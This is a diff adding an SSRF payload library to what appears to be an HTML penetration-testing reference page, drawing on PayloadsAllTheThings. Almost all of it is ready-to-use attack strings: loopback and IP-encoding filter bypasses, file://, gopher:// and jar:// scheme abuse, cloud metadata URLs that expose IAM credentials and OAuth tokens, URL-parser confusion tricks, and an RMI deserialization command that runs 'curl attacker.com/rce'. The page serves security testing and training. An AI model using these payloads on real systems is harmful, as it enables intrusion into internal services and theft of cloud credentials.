@@ -361,6 +361,127 @@ python ssrfmap.py -r req.txt -p url -m redis
 # remote-method-guesser — Java RMI via SSRF (Gopher):
 # rmg serial 127.0.0.1 1099 CommonsCollections6 'curl SSRF_CANARY' --ssrf --gopher</code></pre>
 
+  <h2>SSRF Payload Library</h2>
+  <p>Additional bypass payloads and redirect techniques from PayloadsAllTheThings.</p>
+
+  <h3>Localhost Bypass Variants</h3>
+  <pre><code># IPv6 notation alternatives:
+http://[::]:80/
+http://[0000::1]:80/
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# CIDR loopback range (127.x.x.x all resolve locally):
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+# Domain redirect services:
+http://localtest.me/          # resolves to ::1
+http://localh.st/             # resolves to 127.0.0.1
+http://company.127.0.0.1.nip.io/   # nip.io maps any IP as DNS
+http://spoofed.redacted.oastify.com/  # Burp Collaborator redirect
+
+# Encoded IP variants (all = 127.0.0.1):
+http://0x7f000001/            # hexadecimal
+http://2130706433/            # decimal
+http://0177.0.0.1/            # octal
+http://127.1/                 # shortened notation</code></pre>
+
+  <h3>Protocol Scheme Abuse</h3>
+  <pre><code># file:// — read local files directly:
+file:///etc/passwd
+file:///c:/windows/win.ini
+
+# dict:// — interact with dict servers / Memcached probe:
+dict://127.0.0.1:11211/stat
+
+# sftp:// — trigger SFTP connection (OOB callback):
+sftp://attacker.com:11111/
+
+# tftp:// — UDP-based file transfer probe:
+tftp://attacker.com:12345/TESTUDPPACKET
+
+# ldap:// — trigger LDAP connection (OOB):
+ldap://localhost:389/%0astats%0aquit
+
+# gopher:// — craft arbitrary TCP payloads:
+gopher://127.0.0.1:6379/_PING  -- Redis ping
+gopher://127.0.0.1:9200/_      -- Elasticsearch probe
+
+# netdoc:// (Java URL handler):
+netdoc:///etc/passwd
+
+# jar:// (SSRF + XXE bypass in Java):
+jar:https://attacker.com/payload.jar!/</code></pre>
+
+  <h2>Cloud Metadata Endpoints</h2>
+  <p>Extended cloud provider metadata endpoints from PayloadsAllTheThings.</p>
+
+  <pre><code># AWS IMDSv1 (no auth required):
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/public-keys/
+
+# AWS alternative IPs (bypass naive IP-based filters):
+http://169.254.169.254.nip.io/latest/meta-data/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+
+# GCP (requires Metadata-Flavor: Google header):
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+# Azure (requires Metadata: true header):
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&amp;resource=https://management.azure.com/
+
+# DigitalOcean:
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+
+# Oracle Cloud Infrastructure:
+http://169.254.169.254/opc/v1/instance/
+
+# Alibaba Cloud:
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/</code></pre>
+
+  <h2>SSRF Bypass Techniques</h2>
+  <p>Advanced filter bypass techniques from PayloadsAllTheThings for strict SSRF validators.</p>
+
+  <h3>URL Parser Discrepancy Abuse</h3>
+  <pre><code># PHP filter_var() bypass — accepts these as valid:
+http://0/
+http://127.0.0.1:80@0/
+http://0.0.0.0:80
+
+# @-based confusion (user info trick):
+http://attacker.com@169.254.169.254/
+http://169.254.169.254#@attacker.com/
+http://169.254.169.254%23@attacker.com/
+
+# Backslash (some parsers treat as forward slash):
+http://169.254.169.254\attacker.com/
+
+# Embedded credentials:
+http://user:password@169.254.169.254/
+
+# Fragment-based bypass:
+http://attacker.com#@169.254.169.254/
+
+# DNS rebinding — domain resolves to external IP first, then rebinds to internal:
+# Use: https://github.com/taviso/rbndr or singularity.me for rebinding attacks</code></pre>
+
+  <h3>JAR Scheme and Other Java SSRF</h3>
+  <pre><code># JAR URL handler in Java — can cause the server to download any URL:
+jar:https://attacker.com/evil.jar!/
+jar:file:///var/www/html/app.war!/WEB-INF/web.xml
+
+# Remote Method Guesser — Java RMI via SSRF:
+rmg serial 127.0.0.1 1099 CommonsCollections6 'curl attacker.com/rce' --ssrf --gopher</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>PortSwigger SSRF labs — <code>portswigger.net/web-security/ssrf</code></li>
